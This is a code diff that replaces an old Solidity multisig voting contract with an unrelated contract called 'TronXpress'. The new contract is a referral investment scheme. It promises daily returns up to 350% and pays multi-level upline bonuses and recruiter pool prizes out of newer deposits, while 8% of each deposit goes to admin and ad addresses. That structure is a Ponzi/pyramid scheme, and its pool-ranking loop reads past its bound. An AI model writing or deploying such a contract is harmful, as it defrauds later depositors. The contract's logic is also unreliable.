@@ -1,294 +1,351 @@
-pragma solidity ^0.4.16;
+pragma solidity ^0.5.10;
 
-contract owned {
-    address public owner;
-
-    function owned() {
-        owner = msg.sender;
+contract TronXpress {
+    struct User {
+        uint256 cycle;
+        address upline;
+        uint256 referrals;
+        uint256 payouts;
+        uint256 direct_bonus;
+        uint256 pool_bonus;
+        uint256 match_bonus;
+        uint256 deposit_amount;
+        uint256 deposit_payouts;
+        uint40 deposit_time;
+        uint256 total_deposits;
+        uint256 total_payouts;
+        uint256 total_structure;
     }
 
-    modifier onlyOwner {
+    address payable private owner;
+    uint private releaseTime = 1613131200;
+    address payable private admin_fee;
+    address payable private ad_fund;
+
+    mapping(address => User) public users;
+
+    uint256[] public cycles;
+    uint8[] public ref_bonuses;
+
+    uint8[] public pool_bonuses;
+    uint40 public pool_last_draw = uint40(block.timestamp);
+    uint256 public pool_cycle;
+    uint256 public pool_balance;
+    mapping(uint256 => mapping(address => uint256)) public pool_users_refs_deposits_sum;
+    mapping(uint8 => address) public pool_top;
+    mapping(uint8 => address) public permanent_top;
+
+    uint256 public total_users = 1;
+    uint256 public total_deposited;
+    uint256 public total_withdraw;
+
+    event Upline(address indexed addr, address indexed upline);
+    event NewDeposit(address indexed addr, uint256 amount);
+    event DirectPayout(address indexed addr, address indexed from, uint256 amount);
+    event MatchPayout(address indexed addr, address indexed from, uint256 amount);
+    event PoolPayout(address indexed addr, uint256 amount);
+    event Withdraw(address indexed addr, uint256 amount);
+    event LimitReached(address indexed addr, uint256 amount);
+
+    constructor(address payable _owner,  address payable _admin_fee, address payable _ad_fund) public {
+        owner = _owner;
+        admin_fee = _admin_fee;
+        ad_fund = _ad_fund;
+
+        ref_bonuses.push(25);
+        ref_bonuses.push(10);
+        ref_bonuses.push(10);
+        ref_bonuses.push(10);
+        ref_bonuses.push(8);
+        ref_bonuses.push(8);
+        ref_bonuses.push(8);
+
+        ref_bonuses.push(5);
+        ref_bonuses.push(5);
+        ref_bonuses.push(5);
+        ref_bonuses.push(3);
+        ref_bonuses.push(3);
+        ref_bonuses.push(3);
+        ref_bonuses.push(2);
+        ref_bonuses.push(2);
+      
+        pool_bonuses.push(40);
+        pool_bonuses.push(30);
+        pool_bonuses.push(20);
+        pool_bonuses.push(10);
+
+        cycles.push(1e11);
+        cycles.push(3e11);
+        cycles.push(9e11);
+        cycles.push(2e12);
+    }
+
+    function() payable external {
+        _deposit(msg.sender, msg.value);
+    }
+
+    function _setUpline(address _addr, address _upline) private {
+        if(users[_addr].upline == address(0) && _upline != _addr && _addr != owner && (users[_upline].deposit_time > 0 || _upline == owner)) {
+            users[_addr].upline = _upline;
+            users[_upline].referrals++;
+
+            emit Upline(_addr, _upline);
+            total_users++;
+
+            for(uint8 i = 0; i < ref_bonuses.length; i++) {
+                if(_upline == address(0)) break;
+
+                users[_upline].total_structure++;
+
+                _upline = users[_upline].upline;
+            }
+        }
+    }
+
+    function _deposit(address _addr, uint256 _amount) private {
+        require(users[_addr].upline != address(0) || _addr == owner, "No upline");
+       
+
+        if(users[_addr].deposit_time > 0) {
+            users[_addr].cycle++;
+
+            require(users[_addr].payouts >= this.maxPayoutOf(users[_addr].deposit_amount), "Deposit already exists");
+            require(_amount >= users[_addr].deposit_amount && _amount <= cycles[users[_addr].cycle > cycles.length - 1 ? cycles.length - 1 : users[_addr].cycle], "Bad amount");
+        }
+        else require(_amount >= 5e7 && _amount <= cycles[0], "Bad amount");
+
+        users[_addr].payouts = 0;
+        users[_addr].deposit_amount = _amount;
+        users[_addr].deposit_payouts = 0;
+        users[_addr].deposit_time = uint40(block.timestamp);
+        users[_addr].total_deposits += _amount;
+
+        total_deposited += _amount;
+
+        emit NewDeposit(_addr, _amount);
+
+        if(users[_addr].upline != address(0)) {
+            users[users[_addr].upline].direct_bonus += _amount / 10;
+
+            emit DirectPayout(users[_addr].upline, _addr, _amount / 10);
+        }
+
+        _pollDeposits(_addr, _amount);
+
+        if(pool_last_draw + 1 days < block.timestamp) {
+            _drawPool();
+        }
+
+        admin_fee.transfer(_amount * 6 / 100);
+        ad_fund.transfer(_amount / 50);
+    }
+
+    function _pollDeposits(address _addr, uint256 _amount) private {
+        pool_balance += _amount * 2 / 100;
+
+        address upline = users[_addr].upline;
+
+        if(upline == address(0)) return;
+
+        pool_users_refs_deposits_sum[pool_cycle][upline] += _amount;
+
+        for(uint8 i = 0; i < pool_bonuses.length; i++) {
+            if(pool_top[i] == upline) break;
+
+            if(pool_top[i] == address(0)) {
+                pool_top[i] = upline;
+                break;
+            }
+
+            if(pool_users_refs_deposits_sum[pool_cycle][upline] > pool_users_refs_deposits_sum[pool_cycle][pool_top[i]]) {
+                for(uint8 j = i + 1; j < pool_bonuses.length; j++) {
+                    if(pool_top[j] == upline) {
+                        for(uint8 k = j; k <= pool_bonuses.length; k++) {
+                            pool_top[k] = pool_top[k + 1];
+                        }
+                        break;
+                    }
+                }
+
+                for(uint8 j = uint8(pool_bonuses.length - 1); j > i; j--) {
+                    pool_top[j] = pool_top[j - 1];
+                }
+
+                pool_top[i] = upline;
+
+                break;
+            }
+        }
+    }
+
+    function _refPayout(address _addr, uint256 _amount) private {
+        address up = users[_addr].upline;
+
+        for(uint8 i = 0; i < ref_bonuses.length; i++) {
+            if(up == address(0)) break;
+
+            if(users[up].referrals >= i + 1) {
+                uint256 bonus = _amount * ref_bonuses[i] / 100;
+
+                users[up].match_bonus += bonus;
+
+                emit MatchPayout(up, _addr, bonus);
+            }
+
+            up = users[up].upline;
+        }
+    }
+
+    function _drawPool() private {
+        pool_last_draw = uint40(block.timestamp);
+        pool_cycle++;
+
+        uint256 draw_amount = pool_balance / 10;
+
+        if(draw_amount > 1e11)
+        {
+            draw_amount = 1e11;
+        }
+
+        for(uint8 i = 0; i < pool_bonuses.length; i++) {
+            if(pool_top[i] == address(0)) break;
+
+            uint256 win = draw_amount * pool_bonuses[i] / 100;
+
+            users[pool_top[i]].pool_bonus += win;
+            pool_balance -= win;
+
+            emit PoolPayout(pool_top[i], win);
+        }
+
+        for(uint8 i = 0; i < pool_bonuses.length; i++) {
+            pool_top[i] = address(0);
+        }
+    }
+
+    function deposit(address _upline) payable public {
+         require(now >= releaseTime, "not released yet!");
+        _setUpline(msg.sender, _upline);
+        _deposit(msg.sender, msg.value);
+    }
+
+    function withdraw() public {
+        (uint256 to_payout, uint256 max_payout) = this.payoutOf(msg.sender);
+
+        require(users[msg.sender].payouts < max_payout, "Full payouts");
+        if(to_payout > 0) {
+            if(users[msg.sender].payouts + to_payout > max_payout) {
+                to_payout = max_payout - users[msg.sender].payouts;
+            }
+
+            users[msg.sender].deposit_payouts += to_payout;
+            users[msg.sender].payouts += to_payout;
+
+            _refPayout(msg.sender, to_payout);
+        }
+
+
+        if(users[msg.sender].payouts < max_payout && users[msg.sender].direct_bonus > 0) {
+            uint256 direct_bonus = users[msg.sender].direct_bonus;
+
+            if(users[msg.sender].payouts + direct_bonus > max_payout) {
+                direct_bonus = max_payout - users[msg.sender].payouts;
+            }
+
+            users[msg.sender].direct_bonus -= direct_bonus;
+            users[msg.sender].payouts += direct_bonus;
+            to_payout += direct_bonus;
+        }
+
+        if(users[msg.sender].payouts < max_payout && users[msg.sender].pool_bonus > 0) {
+            uint256 pool_bonus = users[msg.sender].pool_bonus;
+
+            if(users[msg.sender].payouts + pool_bonus > max_payout) {
+                pool_bonus = max_payout - users[msg.sender].payouts;
+            }
+
+            users[msg.sender].pool_bonus -= pool_bonus;
+            users[msg.sender].payouts += pool_bonus;
+            to_payout += pool_bonus;
+        }
+
+        if(users[msg.sender].payouts < max_payout && users[msg.sender].match_bonus > 0) {
+            uint256 match_bonus = users[msg.sender].match_bonus;
+
+            if(users[msg.sender].payouts + match_bonus > max_payout) {
+                match_bonus = max_payout - users[msg.sender].payouts;
+            }
+
+            users[msg.sender].match_bonus -= match_bonus;
+            users[msg.sender].payouts += match_bonus;
+            to_payout += match_bonus;
+        }
+
+        require(to_payout > 0, "Zero payout");
+
+        users[msg.sender].total_payouts += to_payout;
+        total_withdraw += to_payout;
+
+        msg.sender.transfer(to_payout);
+
+        emit Withdraw(msg.sender, to_payout);
+
+        if(users[msg.sender].payouts >= max_payout) {
+            emit LimitReached(msg.sender, users[msg.sender].payouts);
+        }
+    }
+
+    function maxPayoutOf(uint256 _amount) pure public returns(uint256) {
+        return _amount * 35 / 10;
+    }
+
+    function payoutOf(address _addr) view public returns(uint256 payout, uint256 max_payout) {
+        max_payout = this.maxPayoutOf(users[_addr].deposit_amount);
+
+        if(users[_addr].deposit_payouts < max_payout) {
+            payout = (users[_addr].deposit_amount * ((block.timestamp - users[_addr].deposit_time) / 1 days) / 100)
+            + (users[_addr].deposit_amount * ((block.timestamp - users[_addr].deposit_time) / 1 days) / 400)
+            - users[_addr].deposit_payouts;
+
+            if(users[_addr].deposit_payouts + payout > max_payout) {
+                payout = max_payout - users[_addr].deposit_payouts;
+            }
+        }
+    }
+
+    function userInfo(address _addr) view public returns(address upline, uint40 deposit_time, uint256 deposit_amount, uint256 payouts, uint256 direct_bonus, uint256 pool_bonus, uint256 match_bonus) {
+        return (users[_addr].upline, users[_addr].deposit_time, users[_addr].deposit_amount, users[_addr].payouts, users[_addr].direct_bonus, users[_addr].pool_bonus, users[_addr].match_bonus);
+    }
+
+    function userInfoTotals(address _addr) view public returns(uint256 referrals, uint256 total_deposits, uint256 total_payouts, uint256 total_structure) {
+        return (users[_addr].referrals, users[_addr].total_deposits, users[_addr].total_payouts, users[_addr].total_structure);
+    }
+
+    function contractInfo() view public returns(uint256 _total_users, uint256 _total_deposited, uint256 _total_withdraw, uint40 _pool_last_draw, uint256 _pool_balance, uint256 _pool_lider) {
+        return (total_users, total_deposited, total_withdraw, pool_last_draw, pool_balance, pool_users_refs_deposits_sum[pool_cycle][pool_top[0]]);
+    }
+
+    function poolTopInfo() view public returns(address[10] memory addrs, uint256[10] memory deps) {
+        for(uint8 i = 0; i < pool_bonuses.length; i++) {
+            if(pool_top[i] == address(0)) break;
+
+            addrs[i] = pool_top[i];
+            deps[i] = pool_users_refs_deposits_sum[pool_cycle][pool_top[i]];
+        }
+    }
+
+    function getOwner() public view returns(address){
         require(msg.sender == owner);
-        _;
+        return owner;
     }
 
-    function transferOwnership(address newOwner) onlyOwner {
-        owner = newOwner;
-    }
-}
-
-contract tokenRecipient {
-    event receivedEther(address sender, uint amount);
-    event receivedTokens(address _from, uint256 _value, address _token, bytes _extraData);
-
-    function receiveApproval(address _from, uint256 _value, address _token, bytes _extraData){
-        Token t = Token(_token);
-        require(t.transferFrom(_from, this, _value));
-        receivedTokens(_from, _value, _token, _extraData);
+    function getadFund() public view returns(address){
+        require(msg.sender == owner);
+        return ad_fund;
     }
 
-    function () payable {
-        receivedEther(msg.sender, msg.value);
-    }
-}
-
-interface Token {
-    function transferFrom(address _from, address _to, uint256 _value) returns (bool success);
-}
-
-contract TimeLockMultisig is owned, tokenRecipient {
-
-    Proposal[] public proposals;
-    uint public numProposals;
-    mapping (address => uint) public memberId;
-    Member[] public members;
-    uint minimumTime = 10;
-
-    event ProposalAdded(uint proposalID, address recipient, uint amount, string description);
-    event Voted(uint proposalID, bool position, address voter, string justification);
-    event ProposalExecuted(uint proposalID, int result, uint deadline);
-    event MembershipChanged(address member, bool isMember);
-
-    struct Proposal {
-        address recipient;
-        uint amount;
-        string description;
-        bool executed;
-        int currentResult;
-        bytes32 proposalHash;
-        uint creationDate;
-        Vote[] votes;
-        mapping (address => bool) voted;
-    }
-
-    struct Member {
-        address member;
-        string name;
-        uint memberSince;
-    }
-
-    struct Vote {
-        bool inSupport;
-        address voter;
-        string justification;
-    }
-
-    // Modifier that allows only shareholders to vote and create new proposals
-    modifier onlyMembers {
-        require(memberId[msg.sender] != 0);
-        _;
-    }
-
-    /**
-     * Constructor function
-     *
-     * First time setup
-     */
-    function TimeLockMultisig(address founder, address[] initialMembers, uint minimumAmountOfMinutes) payable {
-        if (founder != 0) owner = founder;
-        if (minimumAmountOfMinutes !=0) minimumTime = minimumAmountOfMinutes;
-        // It’s necessary to add an empty first member
-        addMember(0, '');
-        // and let's add the founder, to save a step later
-        addMember(owner, 'founder');
-        changeMembers(initialMembers, true);
-    }
-
-    /**
-     * Add member
-     *
-     * @param targetMember address to add as a member
-     * @param memberName label to give this member address
-     */
-    function addMember(address targetMember, string memberName) onlyOwner {
-        uint id;
-        if (memberId[targetMember] == 0) {
-            memberId[targetMember] = members.length;
-            id = members.length++;
-        } else {
-            id = memberId[targetMember];
-        }
-
-        members[id] = Member({member: targetMember, memberSince: now, name: memberName});
-        MembershipChanged(targetMember, true);
-    }
-
-    /**
-     * Remove member
-     *
-     * @param targetMember the member to remove
-     */
-    function removeMember(address targetMember) onlyOwner {
-        require(memberId[targetMember] != 0);
-
-        for (uint i = memberId[targetMember]; i<members.length-1; i++){
-            members[i] = members[i+1];
-        }
-        delete members[members.length-1];
-        members.length--;
-    }
-
-    /**
-     * Edit existing members
-     *
-     * @param newMembers array of addresses to update
-     * @param canVote new voting value that all the values should be set to
-     */
-    function changeMembers(address[] newMembers, bool canVote) {
-        for (uint i = 0; i < newMembers.length; i++) {
-            if (canVote)
-                addMember(newMembers[i], '');
-            else
-                removeMember(newMembers[i]);
-        }
-    }
-
-    /**
-     * Add Proposal
-     *
-     * Propose to send `weiAmount / 1e18` ether to `beneficiary` for `jobDescription`. `transactionBytecode ? Contains : Does not contain` code.
-     *
-     * @param beneficiary who to send the ether to
-     * @param weiAmount amount of ether to send, in wei
-     * @param jobDescription Description of job
-     * @param transactionBytecode bytecode of transaction
-     */
-    function newProposal(
-        address beneficiary,
-        uint weiAmount,
-        string jobDescription,
-        bytes transactionBytecode
-    )
-        onlyMembers
-        returns (uint proposalID)
-    {
-        proposalID = proposals.length++;
-        Proposal storage p = proposals[proposalID];
-        p.recipient = beneficiary;
-        p.amount = weiAmount;
-        p.description = jobDescription;
-        p.proposalHash = sha3(beneficiary, weiAmount, transactionBytecode);
-        p.executed = false;
-        p.creationDate = now;
-        ProposalAdded(proposalID, beneficiary, weiAmount, jobDescription);
-        numProposals = proposalID+1;
-        vote(proposalID, true, '');
-
-        return proposalID;
-    }
-
-    /**
-     * Add proposal in Ether
-     *
-     * Propose to send `etherAmount` ether to `beneficiary` for `jobDescription`. `transactionBytecode ? Contains : Does not contain` code.
-     * This is a convenience function to use if the amount to be given is in round number of ether units.
-     *
-     * @param beneficiary who to send the ether to
-     * @param etherAmount amount of ether to send
-     * @param jobDescription Description of job
-     * @param transactionBytecode bytecode of transaction
-     */
-    function newProposalInEther(
-        address beneficiary,
-        uint etherAmount,
-        string jobDescription,
-        bytes transactionBytecode
-    )
-        onlyMembers
-        returns (uint proposalID)
-    {
-        return newProposal(beneficiary, etherAmount * 1 ether, jobDescription, transactionBytecode);
-    }
-
-    /**
-     * Check if a proposal code matches
-     *
-     * @param proposalNumber ID number of the proposal to query
-     * @param beneficiary who to send the ether to
-     * @param weiAmount amount of ether to send
-     * @param transactionBytecode bytecode of transaction
-     */
-    function checkProposalCode(
-        uint proposalNumber,
-        address beneficiary,
-        uint weiAmount,
-        bytes transactionBytecode
-    )
-        constant
-        returns (bool codeChecksOut)
-    {
-        Proposal storage p = proposals[proposalNumber];
-        return p.proposalHash == sha3(beneficiary, weiAmount, transactionBytecode);
-    }
-
-    /**
-     * Log a vote for a proposal
-     *
-     * Vote `supportsProposal? in support of : against` proposal #`proposalNumber`
-     *
-     * @param proposalNumber number of proposal
-     * @param supportsProposal either in favor or against it
-     * @param justificationText optional justification text
-     */
-    function vote(
-        uint proposalNumber,
-        bool supportsProposal,
-        string justificationText
-    )
-        onlyMembers
-    {
-        Proposal storage p = proposals[proposalNumber]; // Get the proposal
-        require(p.voted[msg.sender] != true);           // If has already voted, cancel
-        p.voted[msg.sender] = true;                     // Set this voter as having voted
-        if (supportsProposal) {                         // If they support the proposal
-            p.currentResult++;                          // Increase score
-        } else {                                        // If they don't
-            p.currentResult--;                          // Decrease the score
-        }
-
-        // Create a log of this event
-        Voted(proposalNumber,  supportsProposal, msg.sender, justificationText);
-
-        // If you can execute it now, do it
-        if ( now > proposalDeadline(proposalNumber)
-            && p.currentResult > 0
-            && p.proposalHash == sha3(p.recipient, p.amount, '')
-            && supportsProposal) {
-            executeProposal(proposalNumber, '');
-        }
-    }
-
-    function proposalDeadline(uint proposalNumber) constant returns(uint deadline) {
-        Proposal storage p = proposals[proposalNumber];
-        uint factor = calculateFactor(uint(p.currentResult), (members.length - 1));
-        return p.creationDate + uint(factor * minimumTime *  1 minutes);
-    }
-
-    function calculateFactor(uint a, uint b) constant returns (uint factor) {
-        return 2**(20 - (20 * a)/b);
-    }
-
-    /**
-     * Finish vote
-     *
-     * Count the votes proposal #`proposalNumber` and execute it if approved
-     *
-     * @param proposalNumber proposal number
-     * @param transactionBytecode optional: if the transaction contained a bytecode, you need to send it
-     */
-    function executeProposal(uint proposalNumber, bytes transactionBytecode) {
-        Proposal storage p = proposals[proposalNumber];
-
-        require(now >= proposalDeadline(proposalNumber)                                         // If it is past the voting deadline
-            && p.currentResult > 0                                                              // and a minimum quorum has been reached
-            && !p.executed                                                                      // and it is not currently being executed
-            && checkProposalCode(proposalNumber, p.recipient, p.amount, transactionBytecode));  // and the supplied code matches the proposal...
-
-
-        p.executed = true;
-        assert(p.recipient.call.value(p.amount)(transactionBytecode));
-
-        // Fire Events
-        ProposalExecuted(proposalNumber, p.currentResult, proposalDeadline(proposalNumber));
+    function getAdmin() public view returns(address){
+        require(msg.sender == owner);
+        return admin_fee;
     }
 }
